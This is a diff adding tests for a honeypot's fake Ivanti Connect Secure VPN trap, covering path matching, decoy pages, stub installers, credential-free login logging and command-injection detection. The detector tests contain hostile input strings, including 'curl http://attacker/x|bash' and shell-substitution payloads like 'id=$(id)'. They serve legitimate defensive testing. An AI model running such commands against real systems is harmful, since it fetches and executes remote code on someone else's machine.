@@ -351,6 +351,7 @@ def test_all_trap_families_default_on():
     assert tbenv.LLM_ENDPOINT_ENABLED
     assert tbenv.SONICWALL_ENABLED
     assert tbenv.CISCO_WEBVPN_ENABLED
+    assert tbenv.IVANTI_VPN_ENABLED
     assert tbenv.GEOSERVER_ENABLED
     assert tbenv.COLDFUSION_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
@@ -1395,6 +1396,158 @@ async def test_dispatch_cisco_webvpn_jar(flux_client):
 async def test_dispatch_cisco_webvpn_disabled_returns_404(flux_client, monkeypatch):
     monkeypatch.setattr(tbenv, "CISCO_WEBVPN_ENABLED", False)
     resp = await flux_client.get("/+CSCOE+/logon.html", headers={"X-Forwarded-For": "203.0.113.53"})
+    assert resp.status == 404
+    entries = _log_entries(flux_client.log_path)
+    assert entries[-1]["result"] == "not-handled"
+
+
+# --- Fake Ivanti Connect Secure / Pulse Secure trap ---
+
+
+def test_ivanti_vpn_enabled_by_default():
+    assert tbenv.IVANTI_VPN_ENABLED
+
+
+def test_ivanti_vpn_default_paths_match_observed_sequence():
+    for path in (
+        "/dana-na/auth/url_default/welcome.cgi",
+        "/dana-na/auth/url_admin/welcome.cgi",
+        "/dana-na/auth/welcome.cgi",
+        "/dana-na/auth/url_default/login.cgi",
+        "/dana-cached/hc/HostCheckerInstaller.osx",
+        "/dana-cached/hc/HostCheckerInstaller.exe",
+        "/dana-cached/hc/HostCheckerInstaller.dmg",
+        "/dana-ws/namedusers",
+    ):
+        assert tbenv.is_ivanti_vpn_path(path), f"expected match: {path}"
+
+
+def test_ivanti_vpn_path_non_match():
+    for path in [
+        "/",
+        "/dana-na/",
+        "/dana-na/auth/",
+        "/dana-na/auth/login.cgi",  # missing url_default/
+        "/dana-cached/hc/",
+        "/dana-cached/hc/HostCheckerInstaller.tar",  # unsupported suffix
+        "/.env",
+    ]:
+        assert not tbenv.is_ivanti_vpn_path(path), f"unexpected match: {path}"
+
+
+def test_ivanti_vpn_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
+    assert not tbenv.is_ivanti_vpn_path("/dana-na/auth/url_default/welcome.cgi")
+
+
+def test_render_ivanti_welcome_html_shape():
+    body = tbenv.render_ivanti_welcome_html("vpn.example").decode("utf-8")
+    assert "Ivanti Connect Secure" in body
+    assert "/dana-na/auth/url_default/login.cgi" in body
+    assert "vpn.example" in body
+
+
+def test_render_ivanti_hostchecker_stub_magic_bytes():
+    osx = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.osx")
+    assert osx.startswith(b"\xcf\xfa\xed\xfe"), "macOS stub should carry Mach-O magic"
+    exe = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.exe")
+    assert exe.startswith(b"MZ"), "Windows stub should carry PE/DOS magic"
+    dmg = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.dmg")
+    assert dmg.startswith(b"koly"), "DMG stub should carry koly magic"
+
+
+def test_render_ivanti_namedusers_json_shape():
+    body = tbenv.render_ivanti_namedusers_json()
+    payload = json.loads(body)
+    assert payload["result"] == "success"
+    assert payload["data"]["users"] == []
+
+
+def test_extract_ivanti_form_username_and_password_presence():
+    body = b"realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In"
+    username, has_password = tbenv.extract_ivanti_form(body, "application/x-www-form-urlencoded")
+    assert username == "admin"
+    assert has_password is True
+
+
+def test_ivanti_has_cmd_injection_indicators():
+    # Several CVE-2024-21887 PoCs ship classic shell-meta payloads in the
+    # JSON body posted to /dana-ws/namedusers.
+    assert tbenv._ivanti_has_cmd_injection("uname -a; id", "")
+    assert tbenv._ivanti_has_cmd_injection("", "id=$(id)")
+    assert tbenv._ivanti_has_cmd_injection("curl http://attacker/x|bash", "")
+    assert not tbenv._ivanti_has_cmd_injection("plain string", "username=admin")
+
+
+async def test_dispatch_ivanti_welcome(flux_client):
+    resp = await flux_client.get(
+        "/dana-na/auth/url_default/welcome.cgi",
+        headers={"X-Forwarded-For": "203.0.113.71", "Host": "vpn.example"},
+    )
+    assert resp.status == 200
+    text = await resp.text()
+    assert "Ivanti Connect Secure" in text
+    assert "/dana-na/auth/url_default/login.cgi" in text
+
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "ivanti-welcome"
+    assert entry["ivantiPath"] == "/dana-na/auth/url_default/welcome.cgi"
+
+
+async def test_dispatch_ivanti_login_post_logs_username_and_sets_dsid_cookie(flux_client):
+    resp = await flux_client.post(
+        "/dana-na/auth/url_default/login.cgi",
+        data="realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In",
+        headers={
+            "X-Forwarded-For": "203.0.113.72",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    set_cookie = resp.headers.get("Set-Cookie", "")
+    assert "DSID=" in set_cookie
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "ivanti-login-post"
+    assert entry["ivantiUsername"] == "admin"
+    assert entry["ivantiHasPassword"] is True
+    assert "password" not in entry
+
+
+async def test_dispatch_ivanti_hostchecker_installer(flux_client):
+    resp = await flux_client.get(
+        "/dana-cached/hc/HostCheckerInstaller.osx",
+        headers={"X-Forwarded-For": "203.0.113.73"},
+    )
+    assert resp.status == 200
+    body = await resp.read()
+    assert body.startswith(b"\xcf\xfa\xed\xfe")
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "ivanti-hostchecker-installer"
+
+
+async def test_dispatch_ivanti_namedusers_flags_cmd_injection(flux_client):
+    resp = await flux_client.post(
+        "/dana-ws/namedusers",
+        data=b'{"name":"x;id"}',
+        headers={
+            "X-Forwarded-For": "203.0.113.74",
+            "Content-Type": "application/json",
+        },
+    )
+    assert resp.status == 200
+    payload = await resp.json()
+    assert payload["result"] == "success"
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "ivanti-namedusers"
+    assert entry["ivantiHasCmdInjection"] is True
+
+
+async def test_dispatch_ivanti_disabled_returns_404(flux_client, monkeypatch):
+    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
+    resp = await flux_client.get(
+        "/dana-na/auth/url_default/welcome.cgi",
+        headers={"X-Forwarded-For": "203.0.113.75"},
+    )
     assert resp.status == 404
     entries = _log_entries(flux_client.log_path)
     assert entries[-1]["result"] == "not-handled"
